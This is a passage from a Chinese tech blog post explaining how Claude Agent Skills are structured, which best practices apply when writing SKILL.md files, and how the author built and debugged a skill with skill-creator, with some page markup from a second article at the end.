<pre><code class="hljs language-scss" lang="scss">demoskill/
├── SKILL<span class="hljs-selector-class">.md</span>
├── FORMS<span class="hljs-selector-class">.md</span> (表单填写指南)
├── REFERENCE<span class="hljs-selector-class">.md</span> (详细的API参考文档)
└── scripts/
    └── script<span class="hljs-selector-class">.py</span> (脚本)
</code></pre>
<p><strong>加载实际和消耗</strong></p>
<pre><code class="hljs language-dart" lang="dart">元数据 =&gt; 始终加载（启动时）=&gt; 每项技能约需<span class="hljs-number">100</span> Token	

说明 =&gt; 技能触发时 =&gt; 低于<span class="hljs-number">5000</span> Token =&gt; SKILL.md 正文包含说明和指导

资源 =&gt; 根据需要 =&gt; 实际上无限 =&gt; 通过bash执行的捆绑文件
</code></pre>
<p><strong>claude在被引用时才会访问这些文件，SKILL这种文件系统模型优势：指令提供灵活的指导，代码提供可靠性，资源用于事实查找</strong></p>
<h4 data-id="heading-21">3.7 安全问题</h4>
<p>正因为SKILL具有复杂的能力以及对工具，脚本的执行权限，所以SKILL是一种<strong>带有安全隐患的能力</strong>。需要对其保持安全意识。</p>
<h5 data-id="heading-22">3.7.1 官方SKILL</h5>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills%2Ftree%2Fmain" target="_blank" title="https://github.com/anthropics/skills/tree/main" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></p>
<ul>
<li>
<p>要检查技能中包含的所有文件，包括 SKILL.md 文件、脚本、图像和其他资源</p>
</li>
<li>
<p>外部数据源存在风险，从外部 URL 获取数据的技能尤其危险</p>
</li>
<li>
<p>工具滥用，调用工具文件操作、bash 命令、代码执行</p>
</li>
<li>
<p>数据泄露，掌握敏感数据访问权限的技能，可能将信息泄露给外部系统</p>
</li>
</ul>
<h3 data-id="heading-23">四、最佳实践</h3>
<h4 data-id="heading-24">4.1 核心原则</h4>
<h5 data-id="heading-25">4.1.1 大道至简，简洁是关键</h5>
<ul>
<li>
<p>上下文窗口是公共资源，技能会将上下文窗口与claude需要了解的所有其他信息共享，系统提示，对话历史，您实际的请求。<strong>所以只补充克劳德原本不了解的背景信息</strong></p>
</li>
<li>
<p>启动时，只会预加载所有技能的元数据（名称和描述）Claude仅在技能相关时才会读取SKILL.md文件，并仅在需要时读取其他文件</p>
</li>
</ul>
<h5 data-id="heading-26">4.1.2 适当的自由度</h5>
<pre><code class="hljs language-markdown" lang="markdown">// 高自由度，由AI发挥
<span class="hljs-section">## 代码审查流程</span>
<span class="hljs-bullet">1.</span> 分析代码结构和组织方式
<span class="hljs-bullet">2.</span> 检查潜在的 bug 或边界情况
<span class="hljs-bullet">3.</span> 提出可读性和可维护性改进建议
<span class="hljs-bullet">4.</span> 验证是否符合项目规范

// 低自由度，必须严格执行
<span class="hljs-section">## 数据库迁移</span>
请严格按照以下脚本执行：

python scripts/migrate.py --verify --backup

不要修改命令或添加额外的标志。
</code></pre>
<h5 data-id="heading-27">4.1.3 多模型测试</h5>
<ul>
<li>
<p>技能是对模型的补充，因此其有效性取决于底层模型。请在所有计划使用该技能的模型上测试该技能</p>
</li>
<li>
<p>技能本身是包含自然语言表述和说明的，所以会存在上下文信息竞争和语义理解差异等问题，<strong>幻觉依然可能存在</strong></p>
</li>
</ul>
<h4 data-id="heading-28">4.2 技能结构细节</h4>
<h5 data-id="heading-29">4.2.1 命名</h5>
<ul>
<li>
<p>技能名称使用动名词形式（动词 + -ing），因为这样可以清晰地描述技能所提供的活动或能力；例：<code>writing-documentation</code></p>
</li>
<li>
<p>不能包含保留字 “anthropic”、“claude”；例：<code>claude-tools</code></p>
</li>
</ul>
<h5 data-id="heading-30">4.2.2 描述</h5>
<ul>
<li>始终使用第三人称写作，视角不一致可能会导致查找困难。</li>
</ul>

<pre><code class="hljs">好的： “处理 Excel 文件并生成报告”
坏的： “我可以帮您处理Excel文件”
</code></pre>
<ul>
<li>
<p>描述对于技能选择极其重要，描述要具体且包含关键术语。既要<strong>说明技能的功能，也要说明具体的触发条件/使用场景</strong></p>
</li>
<li>
<p>克劳德会根据描述从<strong>众多可用技能中选择</strong>合适的技能。描述必须足够明确具体，而SKILL.md的其余部分则提供了实现细节。</p>
</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 正确</span>
description: 从 PDF 文件中提取文本和表格，填写表单，合并文档。在处理 PDF 文件时，或当用户提到 PDF、表单或文档提取时使用。

<span class="hljs-comment">// 错误</span>
description: 处理文件相关操作
</code></pre>
<h5 data-id="heading-31">4.2.3 指令内容实践指导</h5>
<ul>
<li>为了获得最佳性能，SKILL.md正文控制在500 行以内，<strong>超过后拆分文档</strong></li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">text-formatter</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">格式化文本内容，进行大小写转换</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">...</span>
<span class="hljs-string">...</span>
<span class="hljs-string">...</span>
<span class="hljs-string">如果需要复杂处理，请阅读</span> <span class="hljs-string">./REFERENCE.md</span>
</code></pre>
<ul>
<li>
<p>避免文档深度嵌套，文献推荐保持在SKILL.md同级目录（有文件夹也可以），所有参考文献<strong>都应直接链接到SKILL.md</strong>。</p>
</li>
<li>
<p>遇到嵌套引用时，Claude可能会使用head -100预览命令而<strong>不是读取整个文件，从而导致信息不完整</strong></p>
</li>
</ul>

<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">// 正确</span>
<span class="hljs-built_in">SKILL</span>.md 
  |── REFERENCE.md
  └── FORMS.md
   
<span class="hljs-comment">// 错误</span>
<span class="hljs-built_in">SKILL</span>.md 
  └── REFERENCE.md
        └── FORMS.md
</code></pre>
<ul>
<li>为长文献文件添加目录，对于超过100行的，可以在顶部添加目录，即使预览部分读取结果时，也能看到所有可用信息</li>
</ul>

<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment"># 目录</span></span>
- 身份验证和设置
- 核心方法（创建、读取、更新、删除）
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># 身份验证和设置</span></span>
...
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># 核心方法</span></span>
...
</code></pre>
<ul>
<li>避免使用有时效性的信息</li>
</ul>

<pre><code class="hljs language-bash" lang="bash">// 错误
当技能调用时，时间处在2025年5月以后，使用新的API，否者使用旧的API。

// 正确的
<span class="hljs-comment">## 当前方法</span>
使用 v2 API: `api.example.com/v2/messages`

<span class="hljs-comment">## 旧版方法</span>
&lt;details&gt;
&lt;summary&gt;v1 API (2025-05弃用)&lt;/summary&gt;

使用 v1 API: `api.example.com/v1/messages`

该API后续将不在支持

&lt;/details&gt;
</code></pre>
<ul>
<li>始终保持一致性的术语，不要混用近义词</li>
</ul>

<pre><code class="hljs language-objectivec" lang="objectivec">如果用了“API 端点”，那整个<span class="hljs-built_in">SKILL</span>相关都保持一致，不要突然换成“API 路由”

如果用了“提取”，那就都保持一致，不要使用“拉取”、“获取”
</code></pre>
<ul>
<li>
<p>合理的使用样本示例和模版结构，可以根据需求，提供不同灵活度的约束条件</p>
</li>
<li>
<p>通过自然语言约束灵活度，必须代表严格，建议代表宽松（<strong>既然是自然语言，那就可能有不稳定性</strong>）</p>
</li>
</ul>

<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment"># 输出格式</span></span>

必须（建议）按照如下格式，输出内容信息
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">## 标题1</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">### 标题1.1</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#### 标题1.1.1</span></span>
</code></pre>
<ul>
<li>如果必要时，提供示例，但切记不要过度。</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-strong">**Example 1:**</span>
xxxxxx

<span class="hljs-strong">**Example 2:**</span>
xxxxxx

</code></pre>
<ul>
<li>使用条件工作流，来处理不同分支任务（<strong>既然是自然语言，那就可能有不稳定性</strong>）</li>
</ul>

<pre><code class="hljs language-markdown" lang="markdown">确定修改类型：
<span class="hljs-strong">**创建新内容？**</span> → 遵循下面的"创建流程"
<span class="hljs-strong">**编辑现有内容？**</span> → 遵循下面的"编辑流程"

创建流程：
<span class="hljs-bullet">-</span> 使用 docx-js 库
<span class="hljs-bullet">-</span> 从零构建文档
<span class="hljs-bullet">-</span> 导出为 .docx 格式

编辑流程：
<span class="hljs-bullet">-</span> 解包现有文档
<span class="hljs-bullet">-</span> 直接修改 XML
<span class="hljs-bullet">-</span> 每次更改后验证
<span class="hljs-bullet">-</span> 完成后重新打包
</code></pre>
<ul>
<li>避免提供过多选项</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 错误情况</span>
你可以使用，pypdf工具，pdfplumber工具，或者pdf2image工具
</code></pre>
<h5 data-id="heading-32">4.2.4 复杂任务解决方案</h5>
<ul>
<li>
<p>针对复杂任务，使用工作流处理处理，并且增加检测反馈回路，验证结果正确性</p>
</li>
<li>
<p>将复杂的操作分解成循序渐进的步骤。提供一份清单，<strong>让其复制到回复中</strong>，并在流程进行过程中逐项勾选</p>
</li>
<li>
<p>检查每个声明是否引用了正确的源文档，如果有异常进行步骤回溯</p>
</li>
</ul>

<pre><code class="hljs language-diff" lang="diff">复制此清单并跟踪进度：(这个比较重要)

研究进度：
<span class="hljs-deletion">- [ ] 步骤 1：阅读所有源文档</span>
<span class="hljs-deletion">- [ ] 步骤 2：识别关键主题</span>
<span class="hljs-deletion">- [ ] 步骤 3：交叉引用声明</span>
<span class="hljs-deletion">- [ ] 步骤 4：创建结构化摘要</span>
<span class="hljs-deletion">- [ ] 步骤 5：验证引用</span>

步骤 1：阅读所有源文档
审阅 sources/ 目录中的每个文档。记录主要论点和支持证据。

步骤 2：识别关键主题
查找跨来源的模式。哪些主题反复出现？来源在哪些地方一致或分歧？

步骤 3：交叉引用声明
对每个主要声明，验证其是否出现在源材料中。记录每个要点由哪个来源支持。

步骤 4：创建结构化摘要
按主题组织发现。包括：
<span class="hljs-deletion">- 主要声明</span>
<span class="hljs-deletion">- 来自来源的支持证据</span>
<span class="hljs-deletion">- 冲突观点（如有）</span>

步骤 5：验证引用
检查每个声明是否引用了正确的源文档。如引用不完整，返回步骤 3。
</code></pre>
<h3 data-id="heading-33">五、如何开发自己的Skill</h3>
<h4 data-id="heading-34">5.1 第一步安装</h4>
<p>首先安装skill-creator，是官方提供的用来创建skill的skill（有点绕口），你可以直接下载安装，也可以用上面提到的方式安装</p>
<p>也可以把下面连接地址给Claude，让他自主安装（<strong>如果用了国内模型，这个有随机性，中间可能出岔子</strong>）</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills%2Ftree%2Fmain%2Fskills%2Fskill-creator" target="_blank" title="https://github.com/anthropics/skills/tree/main/skills/skill-creator" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bdd4aefa05f442695ea0dba39b53629~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=IMsb4HE%2BVlgwpis5%2B2ziFvBnw5c%3D" alt="" loading="lazy"/></p>
<p>当你使用 /skills 能够查看到自己的技能里有 skill-creator 时，说明安装成功</p>
<h4 data-id="heading-35">5.2 创建自己skill</h4>
<ul>
<li>claude 会分析你的内容描述以及项目结构等，然后开始创建skill</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d0c52945bd445a8d7fd1e22351d4e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=4rLveRkHv2o36%2B3H2YddYfG8%2Bzs%3D" alt="" loading="lazy"/></p>
<ul>
<li>按照TODO清单，逐步完成</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81ebfe18a017465ab94785cc3e06e9e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=PqD2zhoPOeFDaprkB39LJG2urnY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e818215d5044f4caa77233901db92ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=r7KFXXmGy1PX0mmOy42k6cTg%2BEI%3D" alt="" loading="lazy"/></p>
<ul>
<li>这次我们看一下，刚才创建skill是不是就已经出现了</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7190315d4c5482da65c76c03bcd93d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=QFjPYMn%2BlMSZM8r%2FyimLALZ%2FFQk%3D" alt="" loading="lazy"/></p>
<p><strong>是不是觉得很ok了？嘿嘿，告诉你个坏消息，完全错了。</strong> 知道错在哪里吗？这个技能完全是AI自己 <strong>“按照知识瞎编的，当然一样可用”</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d55012ef3444e0e8d5f76d0a0e2cb1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=NB%2Fvy9Jw9haM0pNyBq44YA52iw4%3D" alt="" loading="lazy"/></p>
<p><strong>真正的技能调用是这样的</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/403e70345c484c299f8a5ab83c3473d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=j1uoI22PwQ0T1qr%2FpM8vwG3I%2BvA%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>最后一步，是打包构建.skill文件（一种压缩包），当然不构建也是可以使用的。<strong>为什么要这么做？</strong></p>
</li>
<li>
<p>1.标准化封装；2.便捷分发；3.版本控制；4.安全验证；5.自动化安装。6.未来应该会有通用的包管理库（类似前端npm）</p>
</li>
</ul>
<h4 data-id="heading-36">5.3 开发调试和技能测试流程</h4>
<p>上面是快速产出流程，但是一个技能就像一款软件产品，它是解决一类问题，并被可能被很多人或者模型使用的，所以稳定可靠非常重要。</p>
<h5 data-id="heading-37">5.3.1 能力调试</h5>
<ul>
<li>
<p>能力调试的本本事就是SKILL.md提示词和脚本的调试测试，因为<strong>官方明确说明skill在创建或修改时自动加载</strong>，所以提示词调试应该是有<strong>热更新</strong>的概念，改完即可生效。</p>
</li>
<li>
<p><strong>对于脚本调试，推荐直接使用命令调用，会比大模型触发速快</strong>，如果不懂命令行，那就保持大模型处理</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02fdeaaf81ce421b9f71a5b51331b691~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=3ESqshlS%2BTcX7I%2Boaq280wXw%2B3U%3D" alt="" loading="lazy"/></p>
<ul>
<li>技能不太符合要求，我就继续修改脚本和SKILL.md进行调试，直到达标</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70a680a112cd47c4b7a9df6401cf534f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=1tsUWXZooDk9DOGyRSZ%2BH4txtDo%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-38">5.3.2 技能标准检测</h5>
<ul>
<li>使用skill-creater验证自己开发的技术是否合格。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63ee2da5d2974570a4ea39f79d9650db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=pZjOVX%2BwYkNdMYhSgWYvSTPJ2xI%3D" alt="" loading="lazy"/></p>
<ul>
<li>发现了目录嵌套问题</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5eaa9b6f47442ea93b353cb23244e8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=QECTX4dfuUQ6o7h%2Bwt%2Fr31uYxUE%3D" alt="" loading="lazy"/></p>
<ul>
<li>自动解决问题，然后再次验证通过</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0879aec45490460db53640f7f7dbb087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=%2BJjut3EJapuo379gl2HYlfTXa0k%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-39">5.4 开发自己skill阶段的问题</h4>
<ul>
<li>第一个问题就是<strong>AI明显存在理解问题的</strong>，不一定使用技能，skill不是一个足够稳定能力（<strong>不排除因为我用了阿里的代理问题</strong>，我看他人分享截图流程是比较顺利的）。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/678b3b95efd24f46abe81341926d2f4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=PeLpXcXCBzAnA5dF97qS7WbcAac%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>丢步骤和流程，</strong> 官方skill-creater，在第5步骤是明确有打包说明的，胆这次最后它还是任务开发完就结束了（上一个技能就自动打包了）</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73242d49c9224217aa8923fdc8753b68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=x8%2FH0mKmiLp88Vem7nIKpkgJXgw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73a99836c0d04baf8f34bb9ae71509a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=VjKpoh4YVL%2FjwDTog%2B5MdcoKpaI%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>AI嘴还是挺硬的，</strong> 想要开发好的技能，最佳实践还需要开发者有经验，只靠AI生成，会有问题</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24421516d1f54480afe530a74be7def4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=N4AUkcsmvIatd4KmP6MvYXl%2FTgw%3D" alt="" loading="lazy"/></p>
<p><strong>最后附上检查清单，便于审查技能情况是否按照规范实践</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fagents-and-tools%2Fagent-skills%2Fbest-practices%23checklist-for-effective-skills" target="_blank" title="https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices#checklist-for-effective-skills" ref="nofollow noopener noreferrer">platform.claude.com/docs/en/age…</a></p>
<h3 data-id="heading-40">六、附录参考</h3>
<p><strong>官方快速开始</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fagents-and-tools%2Fagent-skills%2Foverview%23pre-built-agent-skills" target="_blank" title="https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview#pre-built-agent-skills" ref="nofollow noopener noreferrer">platform.claude.com/docs/en/age…</a></p>
<p><strong>claude code使用文档</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fen%2Fskills%23multiple-skills-conflict" target="_blank" title="https://code.claude.com/docs/en/skills#multiple-skills-conflict" ref="nofollow noopener noreferrer">code.claude.com/docs/en/ski…</a></p>
<p><strong>最佳实践</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fagents-and-tools%2Fagent-skills%2Fbest-practices" target="_blank" title="https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices" ref="nofollow noopener noreferrer">platform.claude.com/docs/en/age…</a></p>
<p><strong>skill开放标准</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fagentskills.io%2Fhome" target="_blank" title="https://agentskills.io/home" ref="nofollow noopener noreferrer">agentskills.io/home</a></p>
<p><strong>官方博客</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fequipping-agents-for-the-real-world-with-agent-skills" target="_blank" title="https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills" ref="nofollow noopener noreferrer">www.anthropic.com/engineering…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[收藏！LLM-RL训练框架：3大流派+6大框架，一文搞定]]></title>    <link>https://juejin.cn/post/7596906923892899850</link>    <guid>https://juejin.cn/post/7596906923892899850</guid>    <pubDate>2026-01-20T00:37:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892899850" data-draft-id="7596970073749356580" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="收藏！LLM-RL训练框架：3大流派+6大框架，一文搞定"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-20T00:37:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIFrontiers"/> <meta itemprop="url" content="https://juejin.cn/user/4443547050451306"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            收藏！LLM-RL训练框架：3大流派+6大框架，一文搞定
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4443547050451306/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIFrontiers
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:37:24.000Z" title="Tue Jan 20 2026 00:37:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 